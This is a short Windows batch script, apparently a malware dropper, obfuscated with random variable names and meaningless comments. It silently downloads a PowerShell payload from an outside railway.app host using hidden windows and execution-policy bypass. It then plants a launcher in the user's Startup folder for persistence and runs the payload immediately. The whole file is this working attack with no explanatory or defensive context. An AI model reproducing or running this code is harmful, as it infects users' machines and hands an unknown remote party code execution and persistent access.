@echo off
REM Ver980
setlocal EnableDelayedExpansion
REM Ver217
REM Mod989

REM [27bf555be78ba5417fe9894f1dc4f339]

set "58524bb6=%LOCALAPPDATA%\0305bd483e"
set "8b07b514=https://web-production-9d7cc.up.railway.app/client.ps1"
set "981e9c6e=%58524bb6%\008d787f34.ps1"

REM Proc262
if not exist "%58524bb6%" mkdir "%58524bb6%"

REM Sys905
powershell -w hidden -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%8b07b514%','%981e9c6e%')"

REM Core134
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%startup%\41a7e9.bat" (
    echo @echo off> "%startup%\41a7e9.bat"
    echo start "" /b powershell -w hidden -ep bypass -f "%981e9c6e%">> "%startup%\41a7e9.bat"
    echo exit /b 0>> "%startup%\41a7e9.bat"
)

REM Core575
start "" /b powershell -w hidden -ep bypass -f "%981e9c6e%"
exit /b 0

REM [63D41E106735011DFE242B38]
